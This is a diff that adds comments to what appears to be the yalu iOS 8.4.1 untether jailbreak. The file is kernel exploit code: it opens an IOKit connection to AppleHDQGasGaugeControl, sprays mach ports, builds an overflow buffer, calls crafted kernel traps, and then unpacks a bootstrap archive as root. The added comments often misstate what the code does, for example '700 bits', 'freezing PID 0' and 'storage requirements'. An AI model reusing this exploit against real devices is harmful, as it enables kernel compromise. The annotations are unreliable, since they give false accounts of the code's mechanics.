@@ -38,6 +38,8 @@ static char* copyoutDataFastLen(mach_port_t ref, mach_vm_size_t* sz) {
     }
     return NULL;
 }
+
+// Adds the untether files on boot.
 static mach_port_t copyinDataFast(char* bytes, size_t size) {
     char msgs[sizeof(oolmsg_t)+0x2000];
     mach_port_t ref = 0;
@@ -48,6 +50,8 @@ static mach_port_t copyinDataFast(char* bytes, size_t size) {
         mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
     }
     bzero(msg,sizeof(oolmsg_t));
+    
+    // Begins to send the files to the device.
     msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
     msg->header.msgh_remote_port = *msgp;
@@ -62,45 +66,81 @@ static mach_port_t copyinDataFast(char* bytes, size_t size) {
     return ref;
 }
 
+// Dumps the message received at boot in hex code.
 void hexdump(unsigned char* ptr, size_t sz) {
     for (int i = 0; i < sz; i+=16) {
         NSLog(@"%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n", ptr[i], ptr[i+1], ptr[i+2], ptr[i+3], ptr[i+4], ptr[i+5], ptr[i+6], ptr[i+7], ptr[i+8], ptr[i+9], ptr[i+10], ptr[i+11], ptr[i+12], ptr[i+13], ptr[i+14], ptr[i+15]);
     }
 }
+
+// On boot up of device...
 int main(int argc, char** argv) {
     __unused int pp = getppid();
+    // Logs the result of the untethering process in a file.
     int fz = open("/var/mobile/Media/kjc_untether.log", O_APPEND|O_CREAT|O_RDWR);
     dup2(fz, STDOUT_FILENO);
     dup2(fz, STDERR_FILENO);
     
-    //
+    // Waits until PID (process ID) 0 is executing -- that is, when the device is turning on.
     int p = fork();
+    
+    // This tests/forces the device state to be greater than 0 (for instance, 1 or 2) -- which means when it is on. (This has to be true in order for the rest of the code to operate.)
     assert(p >= 0);
+    
+    // If the device is on, then freeze PID 0 (startup) until the device has loaded all its files.
     if (p) {
+        // Returns the result of the device state.
         return waitpid(p, 0, 0);
     }
     
+    // Confirmation of device initiating in NSLog.
     NSLog(@"Smoke Britta Erry Day");
     NSLog(@"yalu for ios841 arm64 untether by ~qwertyoruiop[kjc]");
     NSLog(@"+420 swags @ windknown, comex, ih8sn0w, posixninja, _morpheus_, haifisch, jk9357, ttwj, kim jong un");
     NSLog(@"-420 swags @ south (fake) korea, saurik, britta");
+    
+    // Allow interaction with the rest of the device.
     sync();
     kern_return_t err;
     io_iterator_t iterator;
+    
+    // Here is where the fun happens...
+    // Hooks onto HDQGasGaugeControl process (3rd exploit)
     IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
+    
+    // Gets the next instance of the process.
     io_service_t gg = IOIteratorNext(iterator);
+    
+    // Initiates a connection with HDQGasGaugeControl.
     io_connect_t conn;
+    
+    // Patch the kernel with a modified PID 0 process.
     err = IOServiceOpen(gg, mach_task_self(), 0, &conn);
+    
+    // This forces the kernel to have been successfully exploited.
     assert(err == KERN_SUCCESS);
     
+    // [??] This copies a 700-bit array buffer of processes to run on the device, in this case, the jailbreak.
+    // Why 700? Will it not be able to handle more than that? Can't it be a power of 2 such as 512 or 1024 to comply with storage restrictions/requirements?
     mach_port_t spray[700];
     
     for (int i = 0; i < 700; i++) {
+        // [??] copyInDataFast... hmm?
+        // This seems redundant because it could gradually exploit one thing at a time in the kernel to fully gain root access.
+        
+        // 1024 - 0x58 = 700 bits.
         spray[i] = copyinDataFast(pad, 1024 - 0x58);
     }
     
     
     uint64_t inputScalar = 0;
+    
+    // This variable will be used later to overflow the data stack on the device.
+    
+    // 1024 + 0x100 (256) = 1,280 bits
+    // Are the excess bits for the functioning of the regular device?
+    
+    // Maybe you could allocate 512 for the JB and 1024 for the device so there are no communication/data transfer/latency issues across iOS itself.
     char oflow_data[1024+0x100];
     
 #define kern_uint_t uint64_t
@@ -630,6 +670,14 @@ out = IOConnectTrap5(conn_, 0, ((uint64_t)where) - 32, 0x1337133742424242, 0x133
         
         NSLog(@"Beginning extraction.");
         int f = fork();
+        
+        // [??] There seems to be too much going on here. It should just run Cydia and its sub-processes and get it over with.
+        
+        // [??] Why is it already unzipping/uncompressing stuff? Shouldn't a smaller version of the process just load right onto the device?
+        
+        
+        // CPU overflow problems and memory/process problems will probably happen if it's uncompressing a photo and a library while the phone is booting up.
+        
         if (f == 0) {
             execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "xvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
             exit(0);
@@ -637,6 +685,15 @@ out = IOConnectTrap5(conn_, 0, ((uint64_t)where) - 32, 0x1337133742424242, 0x133
         waitpid(f, 0, 0);
 
         NSLog(@"Done extracting.");
+        
+        // Code for running Cydia is below.
+        
+        // Executing on device startup? Hmm... seems a little complicated.
+        // I think it should start with low-level processes so that the kernel and CPU doesn't get all mad at us...
+        
+        
+        // Initiate the CPU here?
+        
         /*
          this fucks shit up without an untether
         f = fork();
@@ -646,19 +703,27 @@ out = IOConnectTrap5(conn_, 0, ((uint64_t)where) - 32, 0x1337133742424242, 0x133
         }
         waitpid(f, 0, 0);
          */
+        
+        // [??] The above needs to be rewritten or moved... there seems to be some latency/communication issues.
+        // The device hasn't even booted to the lock screen yet.
+         
         f = fork();
         if (f == 0) {
             setreuid(501,501);
             execl("/usr/bin/uicache", "uicache", 0);
             exit(0);
         }
+        
         waitpid(f, 0, 0);
         NSLog(@"Done installing loader.");
         
         unlink("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar");
+        
+        // What is exactly being killed here?
         kill(pp, 9);
     }
-
+    
+    // And thus, we are on the lockscreen.
     NSLog(@"alive?!");
     exit(0);
     
